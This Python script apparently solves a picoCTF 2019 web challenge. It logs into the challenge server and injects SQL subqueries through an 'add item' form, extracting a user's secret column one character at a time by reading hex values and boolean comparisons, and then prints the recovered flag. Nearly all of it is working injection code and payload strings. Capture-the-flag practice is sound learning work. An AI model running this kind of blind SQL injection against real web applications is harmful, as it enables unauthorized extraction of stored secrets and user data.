import requests
import json
from bs4 import BeautifulSoup
import string

i = 0
result = []
a_to_f = [w for w in string.ascii_lowercase[:6]]
my_session = requests.Session()
register = my_session.get('https://2019shell1.picoctf.com/problem/27357/login')
soup = BeautifulSoup(register.text,'html.parser')
csrf = soup.find(id="csrf_token").get('value')

login = my_session.post('https://2019shell1.picoctf.com/problem/27357/login',data={'csrf_token':csrf,'username':'e','password':123})
item_list = my_session.get('https://2019shell1.picoctf.com/problem/27357/list_items')
soup2 = BeautifulSoup(item_list.text,'html.parser')
items = [ item.next_sibling.strip('  \n\t') for item in soup2.find_all('strong')]

while True:
  i = i + 1
  my_session.post('https://2019shell1.picoctf.com/problem/27357/add_item',data={'csrf_token':csrf,'item':f"'+ (SELECT hex(substr(secret,{i},1))  FROM user where id='3') +'"})
  item_list = my_session.get('https://2019shell1.picoctf.com/problem/27357/list_items')
  soup2 = BeautifulSoup(item_list.text,'html.parser')
  items = [ item.next_sibling.strip('  \n\t') for item in soup2.find_all('strong')]
  if '0' in items:
    #pop 0
    items.pop()
    result.extend(items)
    break

"""
'+ (SELECT (substr(secret,4,1)='o') FROM user where id='3') +'
"""

if len(result) > 0:
    for idx,res in enumerate(result):
        if len(res) == 1 and res != "0":
            result[idx] = {'hex':res,'possible_values':[bytearray.fromhex(res + ch).decode() for ch in a_to_f]}
            for k in result[idx]["possible_values"]:
              print(f"Testing {idx} for {k}...")
              my_session.post('https://2019shell1.picoctf.com/problem/27357/add_item',data={'csrf_token':csrf,'item':f"'+ (SELECT (substr(secret,{idx+1},1)='{k}')  FROM user where id='3') +'"})
              item_list = my_session.get('https://2019shell1.picoctf.com/problem/27357/list_items')
              soup2 = BeautifulSoup(item_list.text,'html.parser')
              item = [ item.next_sibling.strip('  \n\t') for item in soup2.find_all('strong')][-1]
              print("ITEM : " ,item)
              if item == '1':
                result[idx] = k
                break
        else:
           result[idx] = bytearray.fromhex(res).decode()


print('FLAG : ',"".join(result))
